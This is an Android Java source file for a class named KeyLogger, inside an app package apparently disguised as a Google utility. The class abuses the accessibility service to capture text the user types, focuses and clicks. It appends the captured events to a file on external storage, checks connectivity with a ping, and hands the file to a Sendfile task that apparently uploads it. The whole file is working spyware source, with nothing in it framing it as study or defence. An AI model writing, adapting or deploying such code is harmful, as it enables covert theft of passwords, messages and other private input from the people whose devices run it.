package com.francesco.googleessential;

import android.accessibilityservice.AccessibilityService;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;


import com.francesco.googleessential.model.KeyLog;
import com.francesco.googleessential.util.DateTimeHelper;
import com.francesco.googleessential.util.Helper;
import com.francesco.googleessential.util.Sendfile;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.Map;

public class KeyLogger extends AccessibilityService {

    private final static String LOG_TAG = Helper.getLogTag(KeyLogger.class);
    @Override
    public void onServiceConnected() {
        Log.i(LOG_TAG, "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        Date now = DateTimeHelper.getCurrentDay();
        String accessibilityEvent = null;
        String msg = null;

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                accessibilityEvent = "TYPE_VIEW_TEXT_CHANGED";
                msg = String.valueOf(event.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                accessibilityEvent = "TYPE_VIEW_FOCUSED";
                msg = String.valueOf(event.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                accessibilityEvent = "TYPE_VIEW_CLICKED";
                msg = String.valueOf(event.getText());
                break;
            }
        }

        if (accessibilityEvent == null) {
            return;
        }

        Log.i(LOG_TAG, msg);

        KeyLog keyLog = new KeyLog();
        keyLog.setKeyLogDate(now);
        keyLog.setAccessibilityEvent(accessibilityEvent);
        keyLog.setMsg(msg);

        File file = SaveLog(keyLog);
        try {
            if (isConnected()) {
                Sendfile sf = new Sendfile();
                sf.execute(file.getName(), file.getAbsolutePath());
            }
        } catch (InterruptedException | IOException e) {
            e.printStackTrace();
        }

    }


    private Map<String, String> getMap(KeyLog keyLog) {
        Map<String, String> result = new LinkedHashMap<>();
        result.put("keyLogDate", DateTimeHelper.getTheDateInString(keyLog.getKeyLogDate()));
        result.put("accessibilityEvent", keyLog.getAccessibilityEvent());
        result.put("msg", keyLog.getMsg());
        return result;
    }


    private File SaveLog(KeyLog log) {
        File root = new File(Environment.getExternalStorageDirectory(),"Log");


        if (!root.exists()) {
            root.mkdir();
        } else {
            Log.d("debug","Il file gia esiste");
        }

        File file = new File(root,"Key.txt");
        try{
            if (file.createNewFile()) {
                Log.d("debug","file creato");
            } else {
            Log.d("debug","Il file gia esiste");
        }
            FileWriter myWriter = new FileWriter(file,true);
            myWriter.write(getMap(log).toString());
            myWriter.close();

        } catch (IOException e) {
        e.printStackTrace();
    }

        return file;
    }

    public boolean isConnected() throws InterruptedException, IOException {
        String command = "ping -c 1 google.com";
        return Runtime.getRuntime().exec(command).waitFor() == 0;
    }

    @Override
    public void onInterrupt() {

    }

}
